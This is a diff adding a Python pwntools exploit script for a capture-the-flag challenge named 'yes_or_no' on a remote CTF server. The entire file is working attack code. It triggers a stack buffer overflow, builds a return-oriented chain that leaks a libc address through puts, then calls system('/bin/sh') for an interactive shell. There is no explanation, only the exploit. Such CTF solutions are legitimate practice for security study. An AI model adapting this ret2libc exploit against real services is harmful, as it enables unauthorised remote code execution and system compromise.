@@ -1,0 +1,58 @@
+from pwn import *
+
+
+r = remote("ctf.j0n9hyun.xyz", 3009)
+# r = process("./yes_or_no")
+
+'''
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+'''
+
+puts_plt = 0x400580
+puts_got = 0x601018
+pop_rdi_ret = 0x400883
+ret = 0x40056e
+main = 0x4006c7
+libc = ELF("./libc-2.27.so")
+
+# libc leak
+r.sendline("9830400")
+
+r.recvuntil("Follow me\n")
+
+sleep(0.5)
+
+payload  = b""
+payload += b"a" * 0x12
+payload += b"b" * 8
+payload += p64(pop_rdi_ret)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main)
+
+r.sendline(payload)
+
+
+libc_base = u64(r.recvuntil('\n')[:-1].ljust(8, b"\x00"))
+print(libc_base)
+
+libc_system = libc_base + libc.symbols['system'] - libc.symbols['puts']
+libc_binsh = libc_base + next(libc.search(b'/bin/sh')) - libc.symbols['puts']
+
+# system("/bin/sh")
+r.sendline("9830400")
+payload  = b""
+payload += b"a" * 0x12
+payload += b"b" * 8
+payload += p64(ret)
+payload += p64(pop_rdi_ret)
+payload += p64(libc_binsh)
+payload += p64(libc_system)
+
+r.sendline(payload)
+
+r.interactive()
